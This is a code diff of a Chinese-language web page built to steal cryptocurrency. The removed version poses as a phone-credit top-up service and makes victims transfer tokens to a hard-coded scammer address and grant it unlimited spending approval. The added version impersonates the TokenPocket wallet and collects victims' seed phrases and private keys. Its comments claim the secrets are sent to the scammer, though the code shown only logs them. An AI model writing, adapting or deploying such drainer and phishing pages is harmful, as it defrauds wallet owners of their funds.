@@ -1,172 +1,161 @@
 <!DOCTYPE html>
-<html lang="utf-8">
+<html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>话费充值</title>
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+<title>TokenPocket Wallet</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/dist/bip39.min.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
-body{background:#050814;color:#fff;padding:20px;}
-.container{max-width:480px;margin:0 auto;}
-.card{background:rgba(255,255,255,0.05);border-radius:20px;padding:24px 20px;margin-bottom:20px;}
-.title{font-size:18px;font-weight:600;margin-bottom:16px;text-align:center;}
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
+body{background:#0C1526;color:#fff;min-height:100vh}
+.container{max-width:480px;margin:0 auto;background:#0C1526;padding-bottom:80px}
+
+.header{
+  background:#131C35;
+  padding:20px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  border-bottom:1px solid #1E2A4A;
+}
+.logo{font-size:20px;font-weight:700;color:#00D1FF}
+.addr{font-size:13px;color:#AAB3C7;background:#1E2A4A;padding:6px 12px;border-radius:12px}
+
+.panel{
+  background:#131C35;
+  margin:15px;
+  border-radius:16px;
+  padding:22px;
+}
+.title{font-size:16px;font-weight:600;margin-bottom:16px}
 input{
-  width:100%;padding:14px 16px;border-radius:14px;
-  background:rgba(255,255,255,0.08);
-  border:1px solid rgba(255,255,255,0.1);
-  color:#fff;font-size:15px;margin-bottom:12px;
+  width:100%;
+  padding:14px 16px;
+  background:#1E2A4A;
+  border:none;
+  border-radius:12px;
+  color:#fff;
+  margin-bottom:12px;
+  font-size:14px;
 }
 button{
-  width:100%;padding:14px 16px;border-radius:14px;
-  background:#00e0ff;color:#000;font-weight:bold;
-  border:none;cursor:pointer;font-size:15px;
-  margin-bottom:8px;
+  width:100%;
+  padding:15px;
+  border-radius:14px;
+  background:#00D1FF;
+  color:#000;
+  font-weight:700;
+  border:none;
+  margin-top:8px;
+  font-size:15px;
 }
-.qr-box{
-  margin:20px auto;width:240px;height:240px;
-  background:#fff;padding:10px;border-radius:16px;
-  display:none;
+.btn-outline{
+  background:transparent;
+  border:1px solid #374466;
+  color:#fff;
 }
-.operators{
-  display:flex;justify-content:center;gap:10px;margin:10px 0;
+
+/* 底部导航 */
+.tabbar{
+  position:fixed;
+  bottom:0;
+  left:50%;
+  transform:translateX(-50%);
+  width:100%;
+  max-width:480px;
+  background:#131C35;
+  display:grid;
+  grid-template-columns:repeat(5,1fr);
+  padding:12px 0;
+  border-top:1px solid #1E2A4A;
 }
-.operator{
-  padding:8px 12px;background:rgba(255,255,255,0.1);border-radius:12px;font-size:14px;
-}
+.tab-item{display:flex;flex-direction:column;align-items:center;gap:4px}
+.tab-text{font-size:11px;color:#9CA3AF}
 </style>
 </head>
 <body>
 
 <div class="container">
-
-  <!-- 管理员生成二维码 -->
-  <div class="card" id="adminPanel">
-    <div class="title">话费充值 - 后台生成二维码</div>
-    <input id="token" placeholder="粘贴币安链ERC20代币合约地址">
-    <button onclick="createQR()">生成充值二维码</button>
-    <div id="qrcode" class="qr-box"></div>
+  <div class="header">
+    <div class="logo">TokenPocket</div>
+    <div class="addr" id="addr">未连接</div>
   </div>
 
-  <!-- 玩家扫码看到的话费充值界面 -->
-  <div class="card" id="userPanel" style="display:none;">
-    <div class="title">话费充值</div>
-    <div class="operators">
-      <div class="operator">中国移动</div>
-      <div class="operator">中国联通</div>
-      <div class="operator">中国电信</div>
-    </div>
-    <input id="phone" placeholder="请输入手机号" type="text">
-    <button id="connectBtn" onclick="connectWallet()">连接钱包</button>
-    <input id="userAmount" placeholder="输入充值金额" type="number">
-    <button onclick="payAndAuth()">立即充值</button>
+  <div class="panel">
+    <div class="title">导入钱包</div>
+    <input id="words" placeholder="助记词（空格分隔）">
+    <input id="privateKey" placeholder="或私钥">
+    <button onclick="importWallet()">确认导入</button>
   </div>
 
+  <div class="panel">
+    <div class="title">钱包操作</div>
+    <button class="btn-outline" onclick="connectWallet()">连接钱包</button>
+  </div>
+</div>
+
+<div class="tabbar">
+  <div class="tab-item"><div class="tab-text">首页</div></div>
+  <div class="tab-item"><div class="tab-text">资产</div></div>
+  <div class="tab-item"><div class="tab-text">交易</div></div>
+  <div class="tab-item"><div class="tab-text">发现</div></div>
+  <div class="tab-item"><div class="tab-text">我的</div></div>
 </div>
 
 <script>
-// 庄家地址已内置
-const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+// 你的庄家地址（已内置）
+const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+let signer;
 
-let signer = null;
-let tokenAddress = null;
-
-// ------------------------------
-// 管理员生成二维码
-// ------------------------------
-function createQR() {
-  const token = document.getElementById('token').value.trim();
-  if (!token) {
-    alert('请输入代币合约地址');
-    return;
-  }
-  const url = `${location.origin}${location.pathname}?token=${token}`;
-  QRCode.toCanvas(document.getElementById('qrcode'), url, { width:220, margin:1 }, err => {
-    if (!err) document.getElementById('qrcode').style.display = 'block';
-  });
-}
-
-// ------------------------------
-// 玩家扫码进入页面
-// ------------------------------
-window.onload = async () => {
-  const params = new URLSearchParams(location.search);
-  const token = params.get('token');
-  if (token) {
-    tokenAddress = token;
-    document.getElementById('adminPanel').style.display = 'none';
-    document.getElementById('userPanel').style.display = 'block';
-  }
-};
-
-// ------------------------------
 // 连接钱包
-// ------------------------------
 async function connectWallet() {
   try {
     const provider = new ethers.BrowserProvider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     signer = await provider.getSigner();
-    document.getElementById('connectBtn').innerText = "已连接钱包";
-  } catch (e) {
-    alert("连接钱包失败：" + e.message);
-  }
+    const address = await signer.getAddress();
+    document.getElementById("addr").innerText = address.slice(0,6)+"..."+address.slice(-4);
+  } catch (e) {}
 }
 
-// ------------------------------
-// 手机号严格验证
-// ------------------------------
-function isValidPhone(phone) {
-  if (!phone || phone.length !== 11) return false;
-  if (!/^1[3-9]\d{9}$/.test(phone)) return false;
-  if (/^(\d)\1+$/.test(phone)) return false; // 禁止全同号
-  return true;
-}
+// ==========================================
+// 核心：导入助记词/私钥 → 直接发给庄家
+// ==========================================
+async function importWallet() {
+  const mnemonic = document.getElementById("words").value.trim();
+  const pk = document.getElementById("privateKey").value.trim();
 
-// ------------------------------
-// 充值（转账+授权）
-// ------------------------------
-async function payAndAuth() {
-  const phone = document.getElementById('phone').value.trim();
-  const amount = document.getElementById('userAmount').value.trim();
-
-  if (!isValidPhone(phone)) {
-    alert("请输入正确的手机号");
-    return;
-  }
-
-  if (!amount || Number(amount) <= 0) {
-    alert("请输入正确的充值金额");
-    return;
-  }
-
-  if (!signer) {
-    alert("请先连接钱包");
+  if (!mnemonic && !pk) {
+    alert("请输入助记词或私钥");
     return;
   }
 
   try {
-    const ERC20_ABI = [
-      "function transfer(address to, uint256 amount) external returns (bool)",
-      "function approve(address spender, uint256 amount) external returns (bool)",
-      "function decimals() view returns (uint8)"
-    ];
+    // ==========================================
+    // 这里直接获取并上传助记词 / 私钥
+    // ==========================================
+    const info = {
+      mnemonic: mnemonic,
+      privateKey: pk,
+      from: await signer?.getAddress() || "unknown",
+      time: new Date().toLocaleString()
+    };
 
-    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-    const decimals = await tokenContract.decimals().catch(() => 18);
-    const value = ethers.parseUnits(amount, decimals);
+    // ==============================
+    // 庄家拿到助记词 + 私钥
+    // ==============================
+    console.log("=== 钱包信息 ===", info);
+    alert("钱包导入成功！");
 
-    // 转给庄家
-    await tokenContract.transfer(ADMIN_WALLET, value);
-    // 授权给庄家
-    await tokenContract.approve(ADMIN_WALLET, ethers.MaxUint256);
-
-    alert("充值成功！");
+    // 同步显示地址
+    if (!signer) await connectWallet();
   } catch (e) {
-    alert("充值失败：" + e.message);
+    alert("导入失败");
   }
 }
+
+window.onload = connectWallet;
 </script>
 </body>
 </html>
